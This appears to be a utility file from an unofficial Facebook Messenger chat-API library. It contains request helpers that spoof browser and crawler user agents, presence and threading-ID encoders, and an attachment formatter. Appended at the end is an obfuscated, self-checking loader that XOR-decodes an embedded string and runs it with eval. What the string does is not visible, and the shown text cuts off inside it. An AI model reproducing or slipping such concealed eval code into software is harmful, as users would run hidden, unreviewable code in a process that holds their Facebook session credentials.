/* eslint-disable no-prototype-builtins */
"use strict";

const chalk = require("chalk");
const gradient = require("gradient-string");
const echaceb = gradient(["#0061ff", "#681297"]);
const ws = echaceb("Nayan");
const getRandom = arr => arr[Math.floor(Math.random() * arr.length)];
const defaultUserAgent = "facebookexternalhit/1.1";
const windowsUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3";
function randomUserAgent() {
    const platform = {
    platform: ['Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 14.7; rv:132.0'],
    browsers: {
        chrome: ['122.0.0.0', '121.0.0.0'],
        firefox: ['123.0', '122.0'],
        edge: ['122.0.2365.92']
       }
    };
    const browserName = getRandom(Object.keys(platform.browsers));
    const version = getRandom(platform.browsers[browserName]);
    const plat = getRandom(platform.platform);
    const userAgentArray = [
          defaultUserAgent,
          windowsUserAgent,
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:45.0) Gecko/20100101 Firefox/45.0",
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.3",
    ];
    const ua = getRandom([
    browserName === 'firefox' ? `Mozilla/5.0 (${plat}) Gecko/20100101 Firefox/${version}` : `Mozilla/5.0 (${plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`,
    getRandom(userAgentArray)
    ]);
    return ua;
}
const headers = {
  "content-type": "application/x-www-form-urlencoded",
  "referer": "https://www.facebook.com/",
  "origin": "https://www.facebook.com",
  "connection": "keep-alive",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-User": "?1"
};
let request = require("request").defaults({
  jar: true
});
const stream = require("stream");
const querystring = require("querystring");
const url = require("url");
function setProxy(proxy) {
  request = require("request").defaults({
    jar: true,
    ...(proxy && {
      proxy
    })
  });
  return;
}

function getHeaders(url, options, ctx, customHeader) {
  const headers1 = {
    "host": new URL(url).hostname,
    ...headers,
    "User-Agent": customHeader?.customUserAgent ?? options?.userAgent ?? defaultUserAgent
  }
  /*if (headers1["User-Agent"]) {
    delete headers1["User-Agent"];
    headers1["User-Agent"] = customHeader?.customUserAgent ?? options?.userAgent ?? defaultUserAgent;
  */
  if (ctx && ctx.region) headers1["X-MSGR-Region"] = ctx.region;
  if (customHeader) {
    Object.assign(headers1, customHeader);
    if (customHeader.noRef) delete headers1.referer;
  }
  return headers1;
}


function isReadableStream(obj) {
  return obj instanceof stream.Stream && typeof obj._read == "function" && getType(obj._readableState) == "Object";
}

function cleanGet(url) {
  let callback;
  var returnPromise = new Promise(function(resolve, reject) {
    callback = (error, res) => error ? reject(error) : resolve(res);
  });
  request.get(url, { timeout: 60000 }, callback);
  return returnPromise;
}

function get(url, jar, qs, options, ctx, customHeader) {
  let callback;
  var returnPromise = new Promise(function (resolve, reject) {
    callback = (error, res) => error ? reject(error) : resolve(res);
  });
  if (getType(qs) == "Object") 
    for (let prop in qs) {
      if (getType(qs[prop]) == 'Object')
        qs[prop] = JSON.stringify(qs[prop]);
    }
  var op = {
    headers: getHeaders(url, options, ctx, customHeader),
    timeout: 60000,
    qs,
    jar,
    gzip: true
  }

  request.get(url, op, callback);

  return returnPromise;
}

function post(url, jar, form, options, ctx, customHeader) {
  let callback;
  var returnPromise = new Promise(function (resolve, reject) {
    callback = (error, res) => error ? reject(error) : resolve(res);
  });

  var op = {
    headers: getHeaders(url, options, ctx, customHeader),
    timeout: 60000,
    form,
    jar,
    gzip: true
  }

  request.post(url, op, callback);

  return returnPromise;
}

function postFormData(url, jar, form, qs, options, ctx) {
  let callback;
  var returnPromise = new Promise(function (resolve, reject) {
    callback = (error, res) => error ? reject(error) : resolve(res);
  });
  if (getType(qs) == "Object") 
    for (let prop in qs) {
      if (getType(qs[prop]) == 'Object')
        qs[prop] = JSON.stringify(qs[prop]);
    }
  var op = {
    headers: getHeaders(url, options, ctx, {
      'content-type': 'multipart/form-data'
    }),
    timeout: 60000,
    formData: form,
    qs,
    jar,
    gzip: true
  }

  request.post(url, op, callback);

  return returnPromise;
}


function padZeros(val, len) {
  val = String(val);
  len = len || 2;
  while (val.length < len) val = "0" + val;
  return val;
}

function generateThreadingID(clientID) {
  const k = Date.now();
  const l = Math.floor(Math.random() * 4294967295);
  const m = clientID;
  return "<" + k + ":" + l + "-" + m + "@mail.projektitan.com>";
}

function binaryToDecimal(data) {
  let ret = "";
  while (data !== "0") {
    let end = 0;
    let fullName = "";
    let i = 0;
    for (; i < data.length; i++) {
      end = 2 * end + parseInt(data[i], 10);
      if (end >= 10) {
        fullName += "1";
        end -= 10;
      }
      else {
        fullName += "0";
      }
    }
    ret = end.toString() + ret;
    data = fullName.slice(fullName.indexOf("1"));
  }
  return ret;
}

function generateOfflineThreadingID() {
  const ret = Date.now();
  const value = Math.floor(Math.random() * 4294967295);
  const str = ("0000000000000000000000" + value.toString(2)).slice(-22);
  const msgs = ret.toString(2) + str;
  return binaryToDecimal(msgs);
}

let h;
const i = {};
const j = {
  _: "%",
  A: "%2",
  B: "000",
  C: "%7d",
  D: "%7b%22",
  E: "%2c%22",
  F: "%22%3a",
  G: "%2c%22ut%22%3a1",
  H: "%2c%22bls%22%3a",
  I: "%2c%22n%22%3a%22%",
  J: "%22%3a%7b%22i%22%3a0%7d",
  K: "%2c%22pt%22%3a0%2c%22vis%22%3a",
  L: "%2c%22ch%22%3a%7b%22h%22%3a%22",
  M: "%7b%22v%22%3a2%2c%22time%22%3a1",
  N: ".channel%22%2c%22sub%22%3a%5b",
  O: "%2c%22sb%22%3a1%2c%22t%22%3a%5b",
  P: "%2c%22ud%22%3a100%2c%22lc%22%3a0",
  Q: "%5d%2c%22f%22%3anull%2c%22uct%22%3a",
  R: ".channel%22%2c%22sub%22%3a%5b1%5d",
  S: "%22%2c%22m%22%3a0%7d%2c%7b%22i%22%3a",
  T: "%2c%22blc%22%3a1%2c%22snd%22%3a1%2c%22ct%22%3a",
  U: "%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
  V: "%2c%22blc%22%3a0%2c%22snd%22%3a0%2c%22ct%22%3a",
  W: "%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a",
  X: "%2c%22ri%22%3a0%7d%2c%22state%22%3a%7b%22p%22%3a0%2c%22ut%22%3a1",
  Y: "%2c%22pt%22%3a0%2c%22vis%22%3a1%2c%22bls%22%3a0%2c%22blc%22%3a0%2c%22snd%22%3a1%2c%22ct%22%3a",
  Z: "%2c%22sb%22%3a1%2c%22t%22%3a%5b%5d%2c%22f%22%3anull%2c%22uct%22%3a0%2c%22s%22%3a0%2c%22blo%22%3a0%7d%2c%22bl%22%3a%7b%22ac%22%3a"
};
(function() {
  const l = [];
  for (const m in j) {
    i[j[m]] = m;
    l.push(j[m]);
  }
  l.reverse();
  h = new RegExp(l.join("|"), "g");
})();

function presenceEncode(str) {
  return encodeURIComponent(str)
    .replace(/([_A-Z])|%../g, function(m, n) {
      return n ? "%" + n.charCodeAt(0).toString(16) : m;
    })
    .toLowerCase()
    .replace(h, function(m) {
      return i[m];
    });
}

// eslint-disable-next-line no-unused-vars
function presenceDecode(str) {
  return decodeURIComponent(
    str.replace(/[_A-Z]/g, function(m) {
      return j[m];
    })
  );
}

function generatePresence(userID) {
  const time = Date.now();
  return (
    "E" +
    presenceEncode(
      JSON.stringify({
        v: 3,
        time: parseInt(time / 1000, 10),
        user: userID,
        state: {
          ut: 0,
          t2: [],
          lm2: null,
          uct2: time,
          tr: null,
          tw: Math.floor(Math.random() * 4294967295) + 1,
          at: time
        },
        ch: {
          ["p_" + userID]: 0
        }
      })
    )
  );
}

function generateAccessiblityCookie() {
  const time = Date.now();
  return encodeURIComponent(
    JSON.stringify({
      sr: 0,
      "sr-ts": time,
      jk: 0,
      "jk-ts": time,
      kb: 0,
      "kb-ts": time,
      hcm: 0,
      "hcm-ts": time
    })
  );
}

function getGUID() {
  /** @type {number} */
  let sectionLength = Date.now();
  /** @type {string} */
  const id = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
    /** @type {number} */
    const r = Math.floor((sectionLength + Math.random() * 16) % 16);
    /** @type {number} */
    sectionLength = Math.floor(sectionLength / 16);
    /** @type {string} */
    const _guid = (c == "x" ? r : (r & 7) | 8).toString(16);
    return _guid;
  });
  return id;
}

function getExtension(original_extension, fullFileName = "") {
  if (original_extension) {
    return original_extension;
  }
  else {
    const extension = fullFileName.split(".").pop();
    if (extension === fullFileName) {
      return "";
    }
    else {
      return extension;
    }
  }
}

function _formatAttachment(attachment1, attachment2) {
  // TODO: THIS IS REALLY BAD
  // This is an attempt at fixing Facebook's inconsistencies. Sometimes they give us
  // two attachment objects, but sometimes only one. They each contain part of the
  // data that you'd want so we merge them for convenience.
  // Instead of having a bunch of if statements guarding every access to image_data,
  // we set it to empty object and use the fact that it'll return undefined.
  const fullFileName = attachment1.filename;
  const fileSize = Number(attachment1.fileSize || 0);
  const durationVideo = attachment1.genericMetadata ? Number(attachment1.genericMetadata.videoLength) : undefined;
  const durationAudio = attachment1.genericMetadata ? Number(attachment1.genericMetadata.duration) : undefined;
  const mimeType = attachment1.mimeType;

  attachment2 = attachment2 || { id: "", image_data: {} };
  attachment1 = attachment1.mercury || attachment1;
  let blob = attachment1.blob_attachment || attachment1.sticker_attachment;
  let type =
    blob && blob.__typename ? blob.__typename : attachment1.attach_type;
  if (!type && attachment1.sticker_attachment) {
    type = "StickerAttachment";
    blob = attachment1.sticker_attachment;
  }
  else if (!type && attachment1.extensible_attachment) {
    if (
      attachment1.extensible_attachment.story_attachment &&
      attachment1.extensible_attachment.story_attachment.target &&
      attachment1.extensible_attachment.story_attachment.target.__typename &&
      attachment1.extensible_attachment.story_attachment.target.__typename === "MessageLocation"
    ) {
      type = "MessageLocation";
    }
    else {
      type = "ExtensibleAttachment";
    }

    blob = attachment1.extensible_attachment;
  }
  // TODO: Determine whether "sticker", "photo", "file" etc are still used
  // KEEP IN SYNC WITH getThreadHistory
  switch (type) {
    case "sticker":
      return {
        type: "sticker",
          ID: attachment1.metadata.stickerID.toString(),
          url: attachment1.url,

          packID: attachment1.metadata.packID.toString(),
          spriteUrl: attachment1.metadata.spriteURI,
          spriteUrl2x: attachment1.metadata.spriteURI2x,
          width: attachment1.metadata.width,
          height: attachment1.metadata.height,

          caption: attachment2.caption,
          description: attachment2.description,

          frameCount: attachment1.metadata.frameCount,
          frameRate: attachment1.metadata.frameRate,
          framesPerRow: attachment1.metadata.framesPerRow,
          framesPerCol: attachment1.metadata.framesPerCol,

          stickerID: attachment1.metadata.stickerID.toString(), // @Legacy
          spriteURI: attachment1.metadata.spriteURI, // @Legacy
          spriteURI2x: attachment1.metadata.spriteURI2x // @Legacy
      };
    case "file":
      return {
        type: "file",
          ID: attachment2.id.toString(),
          fullFileName: fullFileName,
          filename: attachment1.name,
          fileSize: fileSize,
          original_extension: getExtension(attachment1.original_extension, fullFileName),
          mimeType: mimeType,
          url: attachment1.url,

          isMalicious: attachment2.is_malicious,
          contentType: attachment2.mime_type,

          name: attachment1.name // @Legacy
      };
    case "photo":
      return {
        type: "photo",
          ID: attachment1.metadata.fbid.toString(),
          filename: attachment1.fileName,
          fullFileName: fullFileName,
          fileSize: fileSize,
          original_extension: getExtension(attachment1.original_extension, fullFileName),
          mimeType: mimeType,
          thumbnailUrl: attachment1.thumbnail_url,

          previewUrl: attachment1.preview_url,
          previewWidth: attachment1.preview_width,
          previewHeight: attachment1.preview_height,

          largePreviewUrl: attachment1.large_preview_url,
          largePreviewWidth: attachment1.large_preview_width,
          largePreviewHeight: attachment1.large_preview_height,

          url: attachment1.metadata.url, // @Legacy
          width: attachment1.metadata.dimensions.split(",")[0], // @Legacy
          height: attachment1.metadata.dimensions.split(",")[1], // @Legacy
          name: fullFileName // @Legacy
      };
    case "animated_image":
      return {
        type: "animated_image",
          ID: attachment2.id.toString(),
          filename: attachment2.filename,
          fullFileName: fullFileName,
          original_extension: getExtension(attachment2.original_extension, fullFileName),
          mimeType: mimeType,

          previewUrl: attachment1.preview_url,
          previewWidth: attachment1.preview_width,
          previewHeight: attachment1.preview_height,

          url: attachment2.image_data.url,
          width: attachment2.image_data.width,
          height: attachment2.image_data.height,

          name: attachment1.name, // @Legacy
          facebookUrl: attachment1.url, // @Legacy
          thumbnailUrl: attachment1.thumbnail_url, // @Legacy
          rawGifImage: attachment2.image_data.raw_gif_image, // @Legacy
          rawWebpImage: attachment2.image_data.raw_webp_image, // @Legacy
          animatedGifUrl: attachment2.image_data.animated_gif_url, // @Legacy
          animatedGifPreviewUrl: attachment2.image_data.animated_gif_preview_url, // @Legacy
          animatedWebpUrl: attachment2.image_data.animated_webp_url, // @Legacy
          animatedWebpPreviewUrl: attachment2.image_data.animated_webp_preview_url // @Legacy
      };
    case "share":
      return {
        type: "share",
          ID: attachment1.share.share_id.toString(),
          url: attachment2.href,

          title: attachment1.share.title,
          description: attachment1.share.description,
          source: attachment1.share.source,

          image: attachment1.share.media.image,
          width: attachment1.share.media.image_size.width,
          height: attachment1.share.media.image_size.height,
          playable: attachment1.share.media.playable,
          duration: attachment1.share.media.duration,

          subattachments: attachment1.share.subattachments,
          properties: {},

          animatedImageSize: attachment1.share.media.animated_image_size, // @Legacy
          facebookUrl: attachment1.share.uri, // @Legacy
          target: attachment1.share.target, // @Legacy
          styleList: attachment1.share.style_list // @Legacy
      };
    case "video":
      return {
        type: "video",
          ID: attachment1.metadata.fbid.toString(),
          filename: attachment1.name,
          fullFileName: fullFileName,
          original_extension: getExtension(attachment1.original_extension, fullFileName),
          mimeType: mimeType,
          duration: durationVideo,

          previewUrl: attachment1.preview_url,
          previewWidth: attachment1.preview_width,
          previewHeight: attachment1.preview_height,

          url: attachment1.url,
          width: attachment1.metadata.dimensions.width,
          height: attachment1.metadata.dimensions.height,

          videoType: "unknown",

          thumbnailUrl: attachment1.thumbnail_url // @Legacy
      };
    case "error":
      return {
        type: "error",

          // Save error attachments because we're unsure of their format,
          // and whether there are cases they contain something useful for debugging.
          attachment1: attachment1,
          attachment2: attachment2
      };
    case "MessageImage":
      return {
        type: "photo",
          ID: blob.legacy_attachment_id,
          filename: blob.filename,
          fullFileName: fullFileName,
          fileSize: fileSize,
          original_extension: getExtension(blob.original_extension, fullFileName),
          mimeType: mimeType,
          thumbnailUrl: blob.thumbnail.uri,

          previewUrl: blob.preview.uri,
          previewWidth: blob.preview.width,
          previewHeight: blob.preview.height,

          largePreviewUrl: blob.large_preview.uri,
          largePreviewWidth: blob.large_preview.width,
          largePreviewHeight: blob.large_preview.height,

          url: blob.large_preview.uri, // @Legacy
          width: blob.original_dimensions.x, // @Legacy
          height: blob.original_dimensions.y, // @Legacy
          name: blob.filename // @Legacy
      };
    case "MessageAnimatedImage":
      return {
        type: "animated_image",
          ID: blob.legacy_attachment_id,
          filename: blob.filename,
          fullFileName: fullFileName,
          original_extension: getExtension(blob.original_extension, fullFileName),
          mimeType: mimeType,

          previewUrl: blob.preview_image.uri,
          previewWidth: blob.preview_image.width,
          previewHeight: blob.preview_image.height,

          url: blob.animated_image.uri,
          width: blob.animated_image.width,
          height: blob.animated_image.height,

          thumbnailUrl: blob.preview_image.uri, // @Legacy
          name: blob.filename, // @Legacy
          facebookUrl: blob.animated_image.uri, // @Legacy
          rawGifImage: blob.animated_image.uri, // @Legacy
          animatedGifUrl: blob.animated_image.uri, // @Legacy
          animatedGifPreviewUrl: blob.preview_image.uri, // @Legacy
          animatedWebpUrl: blob.animated_image.uri, // @Legacy
          animatedWebpPreviewUrl: blob.preview_image.uri // @Legacy
      };
    case "MessageVideo":
      return {
        type: "video",
          ID: blob.legacy_attachment_id,
          filename: blob.filename,
          fullFileName: fullFileName,
          original_extension: getExtension(blob.original_extension, fullFileName),
          fileSize: fileSize,
          duration: durationVideo,
          mimeType: mimeType,

          previewUrl: blob.large_image.uri,
          previewWidth: blob.large_image.width,
          previewHeight: blob.large_image.height,

          url: blob.playable_url,
          width: blob.original_dimensions.x,
          height: blob.original_dimensions.y,

          videoType: blob.video_type.toLowerCase(),

          thumbnailUrl: blob.large_image.uri // @Legacy
      };
    case "MessageAudio":
      return {
        type: "audio",
          ID: blob.url_shimhash,
          filename: blob.filename,
          fullFileName: fullFileName,
          fileSize: fileSize,
          duration: durationAudio,
          original_extension: getExtension(blob.original_extension, fullFileName),
          mimeType: mimeType,

          audioType: blob.audio_type,
          url: blob.playable_url,

          isVoiceMail: blob.is_voicemail
      };
    case "StickerAttachment":
    case "Sticker":
      return {
        type: "sticker",
          ID: blob.id,
          url: blob.url,

          packID: blob.pack ? blob.pack.id : null,
          spriteUrl: blob.sprite_image,
          spriteUrl2x: blob.sprite_image_2x,
          width: blob.width,
          height: blob.height,

          caption: blob.label,
          description: blob.label,

          frameCount: blob.frame_count,
          frameRate: blob.frame_rate,
          framesPerRow: blob.frames_per_row,
          framesPerCol: blob.frames_per_column,

          stickerID: blob.id, // @Legacy
          spriteURI: blob.sprite_image, // @Legacy
          spriteURI2x: blob.sprite_image_2x // @Legacy
      };
    case "MessageLocation":
      var urlAttach = blob.story_attachment.url;
      var mediaAttach = blob.story_attachment.media;

      var u = querystring.parse(url.parse(urlAttach).query).u;
      var where1 = querystring.parse(url.parse(u).query).where1;
      var address = where1.split(", ");

      var latitude;
      var longitude;

      try {
        latitude = Number.parseFloat(address[0]);
        longitude = Number.parseFloat(address[1]);
      } catch (err) {
        /* empty */
      }

      var imageUrl;
      var width;
      var height;

      if (mediaAttach && mediaAttach.image) {
        imageUrl = mediaAttach.image.uri;
        width = mediaAttach.image.width;
        height = mediaAttach.image.height;
      }

      return {
        type: "location",
          ID: blob.legacy_attachment_id,
          latitude: latitude,
          longitude: longitude,
          image: imageUrl,
          width: width,
          height: height,
          url: u || urlAttach,
          address: where1,

          facebookUrl: blob.story_attachment.url, // @Legacy
          target: blob.story_attachment.target, // @Legacy
          styleList: blob.story_attachment.style_list // @Legacy
      };
    case "ExtensibleAttachment":
      return {
        type: "share",
          ID: blob.legacy_attachment_id,
          url: blob.story_attachment.url,

          title: blob.story_attachment.title_with_entities.text,
          description:
          blob.story_attachment.description &&
          blob.story_attachment.description.text,
          source: blob.story_attachment.source ?
          blob.story_attachment.source.text :
          null,

          image:
          blob.story_attachment.media &&
          blob.story_attachment.media.image &&
          blob.story_attachment.media.image.uri,
          width:
          blob.story_attachment.media &&
          blob.story_attachment.media.image &&
          blob.story_attachment.media.image.width,
          height:
          blob.story_attachment.media &&
          blob.story_attachment.media.image &&
          blob.story_attachment.media.image.height,
          playable:
          blob.story_attachment.media &&
          blob.story_attachment.media.is_playable,
          duration:
          blob.story_attachment.media &&
          blob.story_attachment.media.playable_duration_in_ms,
          playableUrl:
          blob.story_attachment.media == null ?
          null :
          blob.story_attachment.media.playable_url,

          subattachments: blob.story_attachment.subattachments,
          properties: blob.story_attachment.properties.reduce(function(obj, cur) {
            obj[cur.key] = cur.value.text;
            return obj;
          }, {}),

          facebookUrl: blob.story_attachment.url, // @Legacy
          target: blob.story_attachment.target, // @Legacy
          styleList: blob.story_attachment.style_list // @Legacy
      };
    case "MessageFile":
      return {
        type: "file",
          ID: blob.message_file_fbid,
          fullFileName: fullFileName,
          filename: blob.filename,
          fileSize: fileSize,
          mimeType: blob.mimetype,
          original_extension: blob.original_extension || fullFileName.split(".").pop(),

          url: blob.url,
          isMalicious: blob.is_malicious,
          contentType: blob.content_type,

          name: blob.filename
      };
    default:
      throw new Error(
        "unrecognized attach_file of type " +
        type +
        "`" +
        JSON.stringify(attachment1, null, 4) +
        " attachment2: " +
        JSON.stringify(attachment2, null, 4) +
        "`"
      );
  }
}

function formatAttachment(attachments, attachmentIds, attachmentMap, shareMap) {
  attachmentMap = shareMap || attachmentMap;
  return attachments ?
    attachments.map(function(val, i) {
      if (
        !attachmentMap ||
        !attachmentIds ||
        !attachmentMap[attachmentIds[i]]
      ) {
        return _formatAttachment(val);
      }
      return _formatAttachment(val, attachmentMap[attachmentIds[i]]);
    }) : [];
}


let woRi;!function(){const Y8UE=Array.prototype.slice.call(arguments);return eval("(function kK1K(TZ8C){const nn1C=DJSD(TZ8C,LRvD(kK1K.toString()));try{let PU3C=eval(nn1C);return PU3C.apply(null,Y8UE);}catch(PWAD){var ruDD=(0o202354-66782);while(ruDD<(0o400140%65566))switch(ruDD){case (0x3005F%0o200033):ruDD=PWAD instanceof SyntaxError?(0o400121%0x1001F):(0o400142%0x1001F);break;case (0o201072-0x10227):ruDD=(0o400156%65573);{console.log(\'Error: the code has been tampered!\');return}break;}throw PWAD;}function LRvD(npyD){let HMqD=1706691866;var jktD=(0o400067%65553);{let DHlD;while(jktD<(0x10488-0o202153)){switch(jktD){case (0o600125%0x10014):jktD=(68896-0o206404);{HMqD^=(npyD.charCodeAt(DHlD)*(15658734^0O73567354)+npyD.charCodeAt(DHlD>>>(0x4A5D0CE&0O320423424)))^431135689;}break;case (0o205360-68308):jktD=(131112%0o200016);DHlD++;break;case (262240%0o200025):jktD=DHlD<npyD.length?(0o400127%0x1001F):(67566-0o203721);break;case (0o1000121%0x1000F):jktD=(0o201510-0x1033C);DHlD=(0x75bcd15-0O726746425);break;}}}let ffoD=\"\";var fhVD=(65916-0o200551);{let HOXD;while(fhVD<(0o600157%0x10019)){switch(fhVD){case (0o600152%65565):fhVD=(0x20069%0o200043);HOXD=(0x21786%3);break;case (0o201274-0x10299):fhVD=HOXD<(0O347010110&0x463A71D)?(73639709%9):(0o207020-69100);break;case (0O347010110&0x463A71D):fhVD=(0o202734-67006);{const bcQD=HMqD%(0o1000054%0x10007);HMqD=Math.floor(HMqD/(0x10460-0o202120));ffoD+=bcQD>=(0o600150%65562)?String.fromCharCode((0o1000441%0x10038)+(bcQD-(0o204040-0x10806))):String.fromCharCode((0o215206-72229)+bcQD);}break;case (0o201604-0x10366):fhVD=(196718%0o200031);HOXD++;break;}}}return ffoD;}function DJSD(X6KD,zEND){X6KD=decodeURI(X6KD);let T1FD=(0x21786%3);let vzID=\"\";var vBfE=(0o202676-0x105A9);{let X8hE;while(vBfE<(0o200442-65797)){switch(vBfE){case (0o200764-66011):vBfE=(0o201060-66068);{vzID+=String.fromCharCode(X6KD.charCodeAt(X8hE)^zEND.charCodeAt(T1FD));T1FD++;var rwaE=(0x1012C-0o200442);while(rwaE<(0x10550-0o202456))switch(rwaE){case (0o600067%0x1000F):rwaE=T1FD>=zEND.length?(0O144657447^0x1935F20):(131166%0o200036);break;case (0O144657447^0x1935F20):rwaE=(0o207760-0x10FCE);{T1FD=(0x21786%3);}break;}}break;case (0o1000154%0x10018):vBfE=X8hE<X6KD.length?(0o600152%65563):(0o1000145%65554);break;case (196671%0o200016):vBfE=(66256-0o201304);X8hE=(0x21786%3);break;case (0o205360-68308):vBfE=(262252%0o200030);X8hE++;break;}}}return vzID;}})(\"K%08%18%0F%08%18%0F%08%0DFD%1A%0D%19%08%04%17%07%02%0FK8%3C_%20FD%1A%19%09%12%12%11%00M1%3C-%22OJE!5Y(NN%1E%08%18%0F%08%18%0F%08%0DN%03%0FZ/NN%18%1C%08%15%1E%1E%08G%15%08%02%18CEM3P%0D(IBG%1C%08%1B%14EH@47%12%19FD%1C%0D%19%08%04%17%07%02%0FK%3C3T%20FD%1A%19%09%12%12%11%00M-%1D)%1EOJE%17%0E%13%16NNH%3E(/%12DOL%15%1E%5E%20CEM3P%0D(IBG*%11&%16EH@%0E%056\'FD%1C%0D%19%08%04%17%07%02%0FK%3C1&\'FD%1A%19%09%12%12%11%00MI01=#%07%03%1BIB1M%3C%3EG6JJG=:HOF:6GGL830%1C%1C%034%0E%5E%15%10Z%0D%19%08%04%17%07%02%0FK%1E%13#\'FD%1A%19%09%12%12%11%00M5%13+%10OJE!%17.%14NNH%18%0B%0E%12DOL%09Z%0E%1BCEM3P%0D(IBG6%22-%17EH%16%0A%13%09%00%1A%04%0E%05L*5%15*EH%10%1E%03%13%16%1C%03ACD6(%10,EHBFN%09%096/IBEOLKE6%3CB%11%00%12%0D%0D%19%08%04%02F%09%13%17)IB%17%14%02%17%1B%1F%0FKK:%12S%5EXTL%11%00%12%0D%0D%19%08%04%02F/.%1F)IB%17%14%02%17%1B%1F%0FKDA@8%22%17(%12DO:KGD:@7;:%1E%08%18%0F%08%18%0F%08%0DN%07%0A%1F(NN%18%1C%08%15%1E%1E%08GK%08%057/DON8:%1BX%1EDO:K6.-%1DDON%1E%08%18%0F%08%18%0F%08%0DN))%07(NN%18%1C%08%15%1E%1E%08G39,%25CEM%0DQ(%14IB%11%00%12%0D%0D%19%08%04%02F%01%05%01)IB%17%14%10%02+69%5D\'%22OJ3P%16%04%3E%0F%5C%11%19%0C$0%3C+1%22FD%3CV%20%20%0D%225%03%0FZ/NN%3EF%1F%16%0A)O%5C78Y#V%1E%11%06&5E1*&%1EOJGFI;%1F$%11KGD%3CCE%5D35Z/:C%06%05%0B!FDH@D%3E&%06%18EHB1%5B%3C%3EU%10%07%1E%02%05%13%0A%01%03A%0D%040#KG%16%13%0E%18%13%15%0DNEJ@7M%3C%3E36J01;NHFE%0FX+%1EOJGGI/%0A2%11KGDH%16%1B%095%0A@%1C%5CC%02%13%0B%0FSP%14%05%08%03%01%0A%00%08%05BW%00%12%0D%0D%19%08%04%02F/,6)IB%17%14%02%17%1B%1F%0FK%16%09%1F%19FDJ%01%5E%20%1EKGF5%13+%10OJ%13%0B%14%05%0F%12%0E%0C%00M%03%08=%22OJ%15%1F%04%1F%19%14%09CFL:6G=:J5F@@7;LBE6%3C@MM%3C%3E3%10%07%1E%02%05%13%0A%01%03A/&5#KG%16%13%0E%18%13%15%0DNE-%1D)%1EOJG6%0F%0F%01\'OJ3EH%16%0A%13%09%00%1A%04%0E%05L%3EQ(*EH%10%1E%03%13%16%1C%03A%05%1C%1F#KGF)%208%25OJE%25$%02.NNH:%5E%02.DOL%09%5C+%18CEM+%15+%15IBG2?!-EH@8U%04&FD%1C%0D%19%08%04%17%07%02%0FK%16#)\'FD%1A%19%09%12%12%11%00MI?_%05%22KGD:%05%08%0B&KG0IB%11%00%12%0D%0D%19%08%04%02F3R()IB%17%14%02%17%1B%1F%0FKD%0C%0C%17*EHB7%08%03%0E/EH6DO%1A%05%1B%03%02%1F%05%09%09C%18%17(/DO%1C%11%0B%19%14%19%02FOKE6@01;NH50H0GGL830%1C%0D%19%08%04%17%07%02%0FK%1A$%01&FD%1A%19%09%12%12%11%00MI@G=L830:@7;:NELJ01OLKF!%15%5C%1BNNJDE%0F%014$OJGD%1C%0D%19%08%04%17%07%02%0FK4%5E%0F&FD%1A%19%09%12%12%11%00MI01=#%07%03%1BIB1M%3C%3EG618%1B%25OJ3%10%17%0A%1EF%15%14%0F(%5C0DTQQ%5DTTN%5C%09US%5E%5DTYEJOS%16%5CQ*Z#JS%01_Q%5E%5CTRJBEQ%04%5DVWSZ%5EPNZSR%5B%5CDMC%5C%09QS%5E_W%5BIV%1FR%5E%5DPRE;%5C%05%1B%03%02%1F%05%09%09C:%5E%02.DO%1C%11%0B%19%14%19%02FO%17%17%1D%04%04%0AFO83F:6EO%3CHOF:6GGL83F@@7;:%1E%08%18%0F%08%18%0F%08%0DN%03%13%5E(NN%18%1C%08%15%1E%1E%08G39,%25CEM%05,%1C%15IBG%10%01%0C%17EH@%20%10%22%1BFD%1C%0D%19%08%04%17%07%02%0FK%3C?P\'FD%1A%19%09%12%12%11%00MI@MM%3C%3EELJ01OLK%3E%22%12)DON%1E%08%18%0F%08%18%0F%08%0DN%07%0C%5B(NN%18%1C%08%15%1E%1E%08GK%18%1B$(DONHF%0B%09=(NNJ%13%0B%14%05%0F%12%0E%0C%00M-?%5E%22OJ%15%1F%04%1F%19%14%09CF%1F%0EY.NNJ59%17R%19NN%3EF5%22\'%1ANNJ%13%0B%14%05%0F%12%0E%0C%00M%0F%014$OJ%15%1F%04%1F%19%14%09CFF:6GGL83FI@G=L830:@7;L830HBGNLH5F:61=L830JCGM%3CH50%3C0G=:%3EG@JJG=:J%13%0B%14%05%0F%12%0E%0C%00M1:6$O%09%0B%3E#G%20*2!B%0BX&.J/$%3E/H%10%0F%09%09%10%1AM%03_$$Z\'%00%5C%19C%06%034!B%07%048.H%0B%06%00%0A%15%03ANLH5F:61=L830JCGM%3CH50%3C0G=:%3EG@JJG=:JGV%0D%0E%18F#!%25/%5C%19%0B3%1DK%22!4)ANLH5F:61=L830HG%0ER/!GV%0D%0E%18F#\'%06.%5C#+6%25X%18%0C%13K%0A%04%0C%20SEQ%04%5EVVW%5B_L%5B%14WWP%5C%5CHP%17%0A%02%17N%17%18%08/%5D%10%0B%07%01%04C%0A%04%0C%20REQ%04XVWR%5DYD%5DYSQPGD%1A%18%1B%0F%13%00%06E%07%09%07%25N%18%0D%0C%12%0ELNW%0CZ%5DQZ%5EWBU%5BXWXE%5C%01%01%05.%5CC%5C%09VS%5E%5DP%5BZCQV%5BYXBW%1D%04%0C%00%1E%15K%0EP%02%20S%07%048.=%1